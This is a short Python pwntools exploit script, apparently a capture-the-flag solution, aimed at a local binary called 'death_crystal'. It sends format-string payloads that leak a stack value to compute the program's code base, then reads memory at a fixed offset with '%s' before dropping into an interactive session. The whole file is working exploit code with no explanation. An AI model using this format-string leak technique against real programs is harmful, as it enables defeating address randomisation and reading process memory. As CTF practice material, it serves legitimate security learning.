#!/usr/bin/python
# -*- coding: UTF-8 -*-
from pwn import *

context.arch = 'amd64'

p = process("./death_crystal")

#pause()

payload = "%d" * 11 + ".%llu"
p.sendlineafter("Foresee:", payload)

p.recvline()
code_base = int(p.recvline().split(".")[1]) - 0xb20

success("code base: {}".format(hex(code_base)))

payload = flat(
    "%d" * 8,
    ".%s.aaaa",
    code_base + 0x202060
    )

p.sendlineafter(":", payload)

p.interactive()
p.close()
